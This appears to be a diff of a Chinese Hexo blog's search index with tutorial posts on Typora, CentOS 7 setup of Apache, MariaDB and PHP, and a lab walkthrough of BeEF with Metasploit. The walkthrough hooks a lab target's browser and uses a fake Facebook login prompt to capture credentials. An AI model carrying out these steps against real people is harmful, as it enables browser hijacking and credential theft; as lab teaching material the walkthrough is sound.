+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200632568.png" alt="image-20211220200632568"></p>
+<p>打开新终端，输入cd /usr/share/beef-xss/，切换到beef-xss目录下，输入<code>./beef –x</code>加载模块</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200906579.png" alt="image-20211220200906579"></p>
+<p>打开浏览器，输入<code>http://ip:3000/ui/panel</code>，访问<code>beef</code>，账号密码都是<code>beef</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201119958.png" alt="image-20211220201119958"></p>
+<p>在靶机访问<code>http://ip:3000/demos/butcher/index.html</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201335685.png" alt="image-20211220201335685"></p>
+<p>返回kali,看到beef自动连接客户端，提示目标已上线</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201458346.png" alt="image-20211220201458346"></p>
+<p>单击目标ip,<code>Details</code>标签显示了客户端主机详细信息，如火狐浏览器，IE6，浏览器支持flash，支持vbscript脚本，操作系统类型</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201907661.png" alt="image-20211220201907661"></p>
+<p>单击<code>commands</code>标签，显示插件</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202003645.png" alt="image-20211220202003645"></p>
+<p>终端进入/var/www/html（apache2默认网站目录）,编辑一个<code>xss.html</code>文件，自定义xss.html网页</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202448920.png" alt="image-20211220202448920"></p>
+<p>终端修改/etc/apache2/ports.conf，修改默认端口号为8080，保存退出</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202622345.png" alt="image-20211220202622345"></p>
+<p>终端启动<code>service apache2 start</code>，没有显示表示启动成功</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202805838.png" alt="image-20211220202805838"></p>
+<p>靶机输入<a href="http://192.168.1.2:8080/xss.html%E8%AE%BF%E9%97%AE%E7%BD%91%E9%A1%B5">http://192.168.1.2:8080/xss.html访问网页</a></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202925168.png" alt="image-20211220202925168"></p>
+<p>返回kali，刷新网页，单击目标ip，点击commans,依次选择<code>Browser</code>,<code>Hooked Domain</code>,<code>Redirect Browser</code>,单击最右侧的<code>RedirectURL</code>,输入<a href="http://192.168.1.2:3000/demos/butcher/index.html,%E4%BD%86%E5%8D%95%E5%87%BB%60Execute%60%EF%BC%8C%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E8%87%AA%E5%8A%A8%E8%AE%BF%E9%97%AE%E6%AD%A4%E7%BD%91%E9%A1%B5">http://192.168.1.2:3000/demos/butcher/index.html,但单击`Execute`，目标主机自动访问此网页</a></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203358764.png" alt="image-20211220203358764"></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203430757.png" alt="image-20211220203430757"></p>
+<p>单击commands标签，选择<code>Social Engineering</code>,<code>Pretty Theft</code>,最右侧选择框模板弹出，选择facebook模板，窃取账号密码，单击Execute，执行攻击</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203726251.png" alt="image-20211220203726251"></p>
+<p>靶机弹出facebook登录对话框，输入账号密码就会被窃取</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203846921.png" alt="image-20211220203846921"></p>
+<p>在beef的<code>Module Result History</code>标签页中，单击历史记录，发现窃取到账号密码</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203919754.png" alt="image-20211220203919754"></p>
+<p>实验完成</p>
+]]></content>
+      <tags>
+        <tag>beef</tag>
+        <tag>msf</tag>
+        <tag>shell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Typora简单语法</title>
-    <url>/2021/11/24/Typora%E7%AE%80%E5%8D%95%E8%AF%AD%E6%B3%95/</url>
+    <url>/blog/2021/11/24/Typora%E7%AE%80%E5%8D%95%E8%AF%AD%E6%B3%95/</url>
     <content><![CDATA[<h2 id="Typora简单语法"><a href="#Typora简单语法" class="headerlink" title="Typora简单语法"></a>Typora简单语法</h2><p>​        typora是一款极致简洁的markdown文本编辑器，支持即时渲染技术，是编写markdown的好手，非常的好用。</p>
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><strong>Typora官网下载链接:</strong> <a href="https://www.typora.io/#download">https://www.typora.io/#download</a></p>
 <p>官网速度是有点慢的，所以这里附上windows64位的链接</p>
@@ -209,11 +262,11 @@
 <h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><p>快捷键: <strong>ctrl+1~6</strong></p>
 <p>清除: 标题放在要清除的行，按下ctrl+0。</p>
 <h3 id="文字加粗、斜体、加粗斜体"><a href="#文字加粗、斜体、加粗斜体" class="headerlink" title="文字加粗、斜体、加粗斜体"></a>文字加粗、斜体、加粗斜体</h3><p>用一对 * 把文字包含就是斜体，(<strong>不要加空格</strong>)。<em>斜体</em></p>
-<p>用两对 * 把文字包含就是粗体，(<strong>不要加空格</strong>)。<strong>粗体</strong></p>
+<p>用两对 * 把文字包含就是粗体，(<strong>不要加空格</strong>)。<strong>粗体</strong><br>加粗符号有规则，前面的**不能跟符号，如果跟符号，则前面有空格，后面的**前面不能有符号，如果有符号，则后面有空格<br>如**(abc)**,应写成空格**(abc)**空格,<strong>(abc)</strong>,</p>
 <p>用三对 * 把文字包含就是加粗斜体，(<strong>不要加空格</strong>)。 <em><strong>加粗斜体</strong></em></p>
 <h3 id="插入表格"><a href="#插入表格" class="headerlink" title="插入表格"></a>插入表格</h3><p>第一种：</p>
 <p>快捷键： ctrl+t  就会出现一个空表格</p>
-<p><img src="/2021/11/24/Typora%E7%AE%80%E5%8D%95%E8%AF%AD%E6%B3%95/Users\23102\AppData\Roaming\Typora\typora-user-images\image-20210806222649296.png" alt="image-20210806222649296"></p>
+<p><img src="/blog/blog/2021/11/24/Typora%E7%AE%80%E5%8D%95%E8%AF%AD%E6%B3%95/Users\23102\AppData\Roaming\Typora\typora-user-images\image-20210806222649296.png" alt="image-20210806222649296"></p>
 <table>
 <thead>
 <tr>
@@ -271,61 +324,8 @@
       </tags>
   </entry>
   <entry>
-    <title>beef+metasploit利用浏览器获取shell</title>
-    <url>/2021/12/20/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/</url>
-    <content><![CDATA[<h2 id="beef-metasploit利用浏览器获取shell"><a href="#beef-metasploit利用浏览器获取shell" class="headerlink" title="beef+metasploit利用浏览器获取shell"></a>beef+metasploit利用浏览器获取shell</h2><h3 id="利用beef获得目标主机shell"><a href="#利用beef获得目标主机shell" class="headerlink" title="利用beef获得目标主机shell"></a>利用beef获得目标主机shell</h3><h4 id="原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。"><a href="#原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。" class="headerlink" title="原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。"></a>原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。</h4><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，将beef和metasploit进行关联，终端进入<code>beef-xss</code>目录，编辑文件<code>config.yaml</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195046684.png" alt="image-20211220195046684"></p>
-<p>将文件中metasploit的<code>enable</code>的<code>false</code>修改为<code>true</code>,保存退出</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195427947.png" alt="image-20211220195427947"></p>
-<p>进入 /usr/share/beef-xss/extensions/metasploit/目录，编辑<code>config.yaml</code>文件，把<code>host</code>的参数跟<code>callback_host</code>参数修改成kali主机ip</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195701762.png" alt="image-20211220195701762"></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195837527.png" alt="image-20211220195837527"></p>
-<p>将<code>custom path</code>的路径修改为 <code>/usr/share/metasploit-framework/</code>，保存退出</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200034953.png" alt="image-20211220200034953"></p>
-<p>输入命令<code>/etc/init.d/postgresql start</code>，启动postgresql服务，输入命令<code>msfdb init</code>，初始化数据库</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200335286.png" alt="image-20211220200335286"></p>
-<p>终端中输入msfconsole，启动metasploit，输入<code>load msgrpc ServerHost=ip Pass=abc123</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200632568.png" alt="image-20211220200632568"></p>
-<p>打开新终端，输入cd /usr/share/beef-xss/，切换到beef-xss目录下，输入<code>./beef –x</code>加载模块</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200906579.png" alt="image-20211220200906579"></p>
-<p>打开浏览器，输入<code>http://ip:3000/ui/panel</code>，访问<code>beef</code>，账号密码都是<code>beef</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201119958.png" alt="image-20211220201119958"></p>
-<p>在靶机访问<code>http://ip:3000/demos/butcher/index.html</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201335685.png" alt="image-20211220201335685"></p>
-<p>返回kali,看到beef自动连接客户端，提示目标已上线</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201458346.png" alt="image-20211220201458346"></p>
-<p>单击目标ip,<code>Details</code>标签显示了客户端主机详细信息，如火狐浏览器，IE6，浏览器支持flash，支持vbscript脚本，操作系统类型</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201907661.png" alt="image-20211220201907661"></p>
-<p>单击<code>commands</code>标签，显示插件</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202003645.png" alt="image-20211220202003645"></p>
-<p>终端进入/var/www/html（apache2默认网站目录）,编辑一个<code>xss.html</code>文件，自定义xss.html网页</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202448920.png" alt="image-20211220202448920"></p>
-<p>终端修改/etc/apache2/ports.conf，修改默认端口号为8080，保存退出</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202622345.png" alt="image-20211220202622345"></p>
-<p>终端启动<code>service apache2 start</code>，没有显示表示启动成功</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202805838.png" alt="image-20211220202805838"></p>
-<p>靶机输入<a href="http://192.168.1.2:8080/xss.html%E8%AE%BF%E9%97%AE%E7%BD%91%E9%A1%B5">http://192.168.1.2:8080/xss.html访问网页</a></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202925168.png" alt="image-20211220202925168"></p>
-<p>返回kali，刷新网页，单击目标ip，点击commans,依次选择<code>Browser</code>,<code>Hooked Domain</code>,<code>Redirect Browser</code>,单击最右侧的<code>RedirectURL</code>,输入<a href="http://192.168.1.2:3000/demos/butcher/index.html,%E4%BD%86%E5%8D%95%E5%87%BB%60Execute%60%EF%BC%8C%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E8%87%AA%E5%8A%A8%E8%AE%BF%E9%97%AE%E6%AD%A4%E7%BD%91%E9%A1%B5">http://192.168.1.2:3000/demos/butcher/index.html,但单击`Execute`，目标主机自动访问此网页</a></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203358764.png" alt="image-20211220203358764"></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203430757.png" alt="image-20211220203430757"></p>
-<p>单击commands标签，选择<code>Social Engineering</code>,<code>Pretty Theft</code>,最右侧选择框模板弹出，选择facebook模板，窃取账号密码，单击Execute，执行攻击</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203726251.png" alt="image-20211220203726251"></p>
-<p>靶机弹出facebook登录对话框，输入账号密码就会被窃取</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203846921.png" alt="image-20211220203846921"></p>
-<p>在beef的<code>Module Result History</code>标签页中，单击历史记录，发现窃取到账号密码</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203919754.png" alt="image-20211220203919754"></p>
-<p>实验完成</p>
-]]></content>
-      <tags>
-        <tag>beef</tag>
-        <tag>msf</tag>
-        <tag>shell</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>centos7安装apache</title>
-    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85apache/</url>
+    <url>/blog/2021/11/24/centos7%E5%AE%89%E8%A3%85apache/</url>
     <content><![CDATA[<h2 id="centos7-安装Apache"><a href="#centos7-安装Apache" class="headerlink" title="centos7 安装Apache"></a>centos7 安装Apache</h2><h3 id="实验准备：vmware上安装的centos7"><a href="#实验准备：vmware上安装的centos7" class="headerlink" title="实验准备：vmware上安装的centos7"></a>实验准备：vmware上安装的centos7</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br></pre></td></tr></table></figure>
 
 <h3 id="安装Apache："><a href="#安装Apache：" class="headerlink" title="安装Apache："></a>安装Apache：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install httpd</span></span><br></pre></td></tr></table></figure>
@@ -349,8 +349,28 @@
       </tags>
   </entry>
   <entry>
+    <title>centos7安装mariadb</title>
+    <url>/blog/2021/11/24/centos7%E5%AE%89%E8%A3%85mariadb/</url>
+    <content><![CDATA[<h2 id="centos7安装mariadb"><a href="#centos7安装mariadb" class="headerlink" title="centos7安装mariadb"></a>centos7安装mariadb</h2><p>mariadb是MYSQL的一个分支，语法基本和mysql一样，而且兼容mysql，centos7中自带了mariadb的软件包。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+
+<h3 id="安装mariadb："><a href="#安装mariadb：" class="headerlink" title="安装mariadb："></a>安装mariadb：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install mariadb-server</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="开启mariadb并设置开机启动："><a href="#开启mariadb并设置开机启动：" class="headerlink" title="开启mariadb并设置开机启动："></a>开启mariadb并设置开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> mariadb</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/mariadb.service to /usr/lib/systemd/system/mariadb.service.</span><br></pre></td></tr></table></figure>
+
+<h3 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql_secure_installation</span></span><br><span class="line">Enter current password for root (enter for none):  # 输入数据库超级管理员root的密码(注意不是系统root的密码)，第一次进入还没有设置密码则直接回车</span><br><span class="line"></span><br><span class="line">Set root password? [Y/n]  # 设置密码，y</span><br><span class="line"></span><br><span class="line">New password:  # 新密码</span><br><span class="line">Re-enter new password:  # 再次输入密码</span><br><span class="line"></span><br><span class="line">Remove anonymous users? [Y/n]  # 移除匿名用户， y</span><br><span class="line"></span><br><span class="line">Disallow root login remotely? [Y/n]  # 拒绝root远程登录，n，不管y/n，都会拒绝root远程登录</span><br><span class="line"></span><br><span class="line">Remove test database and access to it? [Y/n]  # 删除test数据库，y：删除。n：不删除，数据库中会有一个test数据库，一般不需要</span><br><span class="line"></span><br><span class="line">Reload privilege tables now? [Y/n]  # 重新加载权限表，y</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动数据库"><a href="#启动数据库" class="headerlink" title="启动数据库"></a>启动数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql -u root -p</span></span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 2</span><br><span class="line">Server version: 5.5.68-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; quit;</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>centos7</tag>
+        <tag>mariadb</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>centos7安装php</title>
-    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85php/</url>
+    <url>/blog/2021/11/24/centos7%E5%AE%89%E8%A3%85php/</url>
     <content><![CDATA[<h2 id="centos7安装php"><a href="#centos7安装php" class="headerlink" title="centos7安装php"></a>centos7安装php</h2><p>环境是apache2+mariadb+php</p>
 <p>先安装php</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install php</span></span><br></pre></td></tr></table></figure>
@@ -372,39 +392,8 @@
       </tags>
   </entry>
   <entry>
-    <title>centos7安装mariadb</title>
-    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85mariadb/</url>
-    <content><![CDATA[<h2 id="centos7安装mariadb"><a href="#centos7安装mariadb" class="headerlink" title="centos7安装mariadb"></a>centos7安装mariadb</h2><p>mariadb是MYSQL的一个分支，语法基本和mysql一样，而且兼容mysql，centos7中自带了mariadb的软件包。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
-
-<h3 id="安装mariadb："><a href="#安装mariadb：" class="headerlink" title="安装mariadb："></a>安装mariadb：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install mariadb-server</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="开启mariadb并设置开机启动："><a href="#开启mariadb并设置开机启动：" class="headerlink" title="开启mariadb并设置开机启动："></a>开启mariadb并设置开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> mariadb</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/mariadb.service to /usr/lib/systemd/system/mariadb.service.</span><br></pre></td></tr></table></figure>
-
-<h3 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql_secure_installation</span></span><br><span class="line">Enter current password for root (enter for none):  # 输入数据库超级管理员root的密码(注意不是系统root的密码)，第一次进入还没有设置密码则直接回车</span><br><span class="line"></span><br><span class="line">Set root password? [Y/n]  # 设置密码，y</span><br><span class="line"></span><br><span class="line">New password:  # 新密码</span><br><span class="line">Re-enter new password:  # 再次输入密码</span><br><span class="line"></span><br><span class="line">Remove anonymous users? [Y/n]  # 移除匿名用户， y</span><br><span class="line"></span><br><span class="line">Disallow root login remotely? [Y/n]  # 拒绝root远程登录，n，不管y/n，都会拒绝root远程登录</span><br><span class="line"></span><br><span class="line">Remove test database and access to it? [Y/n]  # 删除test数据库，y：删除。n：不删除，数据库中会有一个test数据库，一般不需要</span><br><span class="line"></span><br><span class="line">Reload privilege tables now? [Y/n]  # 重新加载权限表，y</span><br></pre></td></tr></table></figure>
-
-<h3 id="启动数据库"><a href="#启动数据库" class="headerlink" title="启动数据库"></a>启动数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql -u root -p</span></span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 2</span><br><span class="line">Server version: 5.5.68-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; quit;</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>centos7</tag>
-        <tag>mariadb</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>first-blog</title>
-    <url>/2021/11/24/first-blog/</url>
-    <content><![CDATA[<h2 id="Test-for-my-first-blog"><a href="#Test-for-my-first-blog" class="headerlink" title="Test for my first blog"></a>Test for my first blog</h2><p>这是正文。</p>
-<p><img src="/2021/11/24/first-blog/image-20211124165347049.png"></p>
-<p>11</p>
-]]></content>
-      <tags>
-        <tag>test</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>metasploit之PostgreSQL</title>
-    <url>/2021/12/21/metasploit%E4%B9%8BPostgreSQL/</url>
+    <url>/blog/2021/12/21/metasploit%E4%B9%8BPostgreSQL/</url>
